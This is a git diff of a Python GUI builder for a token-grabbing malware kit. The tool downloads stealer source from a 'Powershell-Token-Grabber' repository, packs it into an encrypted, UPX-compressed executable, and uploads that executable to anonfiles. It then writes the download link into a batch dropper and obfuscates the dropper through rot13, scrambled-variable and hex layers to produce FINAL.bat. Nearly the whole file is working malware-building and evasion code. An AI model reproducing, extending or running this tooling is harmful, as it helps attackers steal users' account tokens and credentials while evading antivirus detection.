@@ -1,38 +1,43 @@
 import tkinter as tk #prolly built in but idk ngl
-import os
-import random
-from random import randint
-import codecs
-import string
-import webbrowser
-import zipfile
-import io
-import shutil
-import time
+from os import system, path, remove, rename
+from random import choice, sample, randint
+from codecs import encode
+from string import ascii_letters
+from webbrowser import open as open_web
+from zipfile import ZipFile
+from io import BytesIO
+from shutil import rmtree
+from time import sleep
 
 try:
     import customtkinter as kdot
 except:
-    os.system("pip install customtkinter")
+    system("pip install customtkinter")
     import customtkinter as kdot
     
 try:
     from PIL import Image
 except:
-    os.system("pip install pillow")
+    system("pip install pillow")
     from PIL import Image
 
 try:
     import requests
 except:
-    os.system("pip install requests")
+    system("pip install requests")
     import requests
 
 try:
     import PyInstaller
 except:
-    os.system("pip install pyinstaller")
+    system("pip install pyinstaller")
     import PyInstaller
+
+try:
+    from tqdm import tqdm
+except:
+    system("pip install tqdm")
+    from tqdm import tqdm
 
 code = r"""
 @echo off
@@ -52,20 +57,20 @@ class Buidler(kdot.CTk):
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure((1,2), weight=1)
         
-        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "test_images")
+        image_path = path.join(path.dirname(path.realpath(__file__)), "test_images")
         
         # use icon for image
-        self.iconphoto(False, tk.PhotoImage(file=os.path.join(image_path, "logo.png")))
+        self.iconphoto(False, tk.PhotoImage(file=path.join(image_path, "logo.png")))
         
         
-        self.home_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "home_dark.png")), dark_image=Image.open(os.path.join(image_path, "home_light.png")), size=(20, 20))
-        self.about_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "about_dark.png")), dark_image=Image.open(os.path.join(image_path, "about_dark.png")), size=(20, 20))
-        self.hentai_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "hentai_dark.png")), dark_image=Image.open(os.path.join(image_path, "hentai_dark.png")), size=(20, 20))
-        self.bottom_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "Kendrick.jpg")), dark_image=Image.open(os.path.join(image_path, "Kendrick.jpg")), size=(500, 230))
-        self.github_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "github.png")), dark_image=Image.open(os.path.join(image_path, "github.png")), size=(20, 20))
-        self.discord_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "discord.png")), dark_image=Image.open(os.path.join(image_path, "discord.png")), size=(20, 20))
-        self.somali_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "logo.png")), dark_image=Image.open(os.path.join(image_path, "logo.png")), size=(30, 24))
-        self.comethazine_image = kdot.CTkImage(light_image=Image.open(os.path.join(image_path, "comethazine.png")), dark_image=Image.open(os.path.join(image_path, "comethazine.png")), size=(100, 100))
+        self.home_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "home_dark.png")), dark_image=Image.open(path.join(image_path, "home_light.png")), size=(20, 20))
+        self.about_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "about_dark.png")), dark_image=Image.open(path.join(image_path, "about_dark.png")), size=(20, 20))
+        self.hentai_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "hentai_dark.png")), dark_image=Image.open(path.join(image_path, "hentai_dark.png")), size=(20, 20))
+        self.bottom_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "Kendrick.jpg")), dark_image=Image.open(path.join(image_path, "Kendrick.jpg")), size=(500, 230))
+        self.github_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "github.png")), dark_image=Image.open(path.join(image_path, "github.png")), size=(20, 20))
+        self.discord_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "discord.png")), dark_image=Image.open(path.join(image_path, "discord.png")), size=(20, 20))
+        self.somali_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "logo.png")), dark_image=Image.open(path.join(image_path, "logo.png")), size=(30, 24))
+        self.comethazine_image = kdot.CTkImage(light_image=Image.open(path.join(image_path, "comethazine.png")), dark_image=Image.open(path.join(image_path, "comethazine.png")), size=(100, 100))
         
         self.navigation_frame = kdot.CTkFrame(self, corner_radius=0)
         self.navigation_frame.grid(row=0, column=0, sticky="nsew")
@@ -153,13 +158,13 @@ class Buidler(kdot.CTk):
         
     
     def github_button_event(self):
-        webbrowser.open("https://github.com/kdot227")
+        open_web("https://github.com/kdot227")
         
     def somali_button_event(self):
-        webbrowser.open("https://sped.lol")
+        open_web("https://sped.lol")
         
     def discord_button_event(self):
-        webbrowser.open("https://discord.gg/BScgW3ghP3")
+        open_web("https://discord.gg/BScgW3ghP3")
         
     def home_button_event(self):
         self.select_frame_by_name("home")
@@ -225,23 +230,23 @@ class Buidler(kdot.CTk):
             self.top_level_warning.update()
             self.top_level_warning_label.configure(text="THIS IS STILL UNDER DEVELOPMENT!\nFEATURES LIKE BUILD OWN EXE\nMIGHT NOT WORK\nUSE AT OWN RIST")
             self.top_level_warning.update()
-            time.sleep(5)
+            sleep(5)
             self.top_level_warning.destroy()
             py_code = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.py'
-            os.system('pip install pycryptodome pypiwin32')
+            system('pip install pycryptodome pypiwin32')
             with open("test.py", "w") as f:
                 f.write(requests.get(py_code).text)
             upx_url = "https://github.com/upx/upx/releases/download/v4.0.1/upx-4.0.1-win64.zip"
-            upx_zip = zipfile.ZipFile(io.BytesIO(requests.get(upx_url).content))
+            upx_zip = ZipFile(BytesIO(requests.get(upx_url).content))
             upx_zip.extractall()
-            os.system("pyinstaller --onefile --key GODFATHER --clean --upx-dir upx-4.0.1-win64 test.py")
-            os.remove("test.py")
-            os.remove("test.spec")
-            shutil.rmtree("build")
-            shutil.rmtree("upx-4.0.1-win64")
+            system("pyinstaller --onefile --key GODFATHER --clean --upx-dir upx-4.0.1-win64 test.py")
+            remove("test.py")
+            remove("test.spec")
+            rmtree("build")
+            rmtree("upx-4.0.1-win64")
             print("Uploading!\nThis might take some time!\n")
             upload_to_anon = requests.post("https://api.anonfiles.com/upload", files={"file": open("dist/test.exe", "rb")})
-            shutil.rmtree("dist")
+            rmtree("dist")
             anon_url = upload_to_anon.json()["data"]["file"]["url"]["full"]
             direct_download_url = anon_url.replace("https://anonfiles.com/", "https://cdn.anonfiles.com/")
             self.code.replace('https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/test.exe', direct_download_url)
@@ -277,7 +282,7 @@ class Buidler(kdot.CTk):
         
     def make_random_string(self):
         length = randint(5, 8)
-        return ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZḆḞԍǏƘԸɌȚЦѠƳȤѧćễļṃŉᵲừŵź☠☢☣卐") for i in range(length))
+        return ''.join(choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZḆḞԍǏƘԸɌȚЦѠƳȤѧćễļṃŉᵲừŵź☠☢☣卐") for i in range(length))
             
     def level1(self):
         carrot = False
@@ -307,13 +312,13 @@ class Buidler(kdot.CTk):
                             
                         else:
                             random = self.make_random_string()
-                            if char in string.ascii_letters:
+                            if char in ascii_letters:
                                 if char.islower():
-                                    coded0 = codecs.encode(char, 'rot_13')
+                                    coded0 = encode(char, 'rot_13')
                                     coded = coded0.replace(coded0, f"%{coded0}%")
                                     f.write(f"{coded}%{random}%")
                                 else:
-                                    coded0 = codecs.encode(char, 'rot_13').upper()
+                                    coded0 = encode(char, 'rot_13').upper()
                                     coded = coded0.replace(coded0, f'%{coded0}1%')
                                     f.write(f"{coded}%{random}%")
                             else:
@@ -321,7 +326,7 @@ class Buidler(kdot.CTk):
                                 
     def level2(self):
         characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
-        random_order = ''.join(random.sample(characters, len(characters)))
+        random_order = ''.join(sample(characters, len(characters)))
         carrot = False
         var = False
         with open("main.level2.bat", "a+", encoding="utf-8") as f:
@@ -348,7 +353,7 @@ class Buidler(kdot.CTk):
                             f.write(char)
                             
                         else:
-                            if char in string.ascii_letters:
+                            if char in ascii_letters:
                                 var = f"%KDOT:~{random_order.index(char)},1%"
                                 f.write(var)
                             else:
@@ -370,7 +375,7 @@ class Buidler(kdot.CTk):
             for i in out_hex:
                 f.write(bytes.fromhex(i))
                 
-        os.remove('holder.bat')
+        remove('holder.bat')
             
     def all(self):
         names = []
@@ -381,9 +386,9 @@ class Buidler(kdot.CTk):
         self.file = f"main.level1.bat"
         names.append(self.file)
         self.level3()
-        os.rename(f"main.level3.bat", "FINAL.bat")
+        rename(f"main.level3.bat", "FINAL.bat")
         for name in names:
-            os.remove(name)
+            remove(name)
         print("FINAL.bat is the finished product!")
         self.create_top_level("FINAL.bat is the finished product!")
         
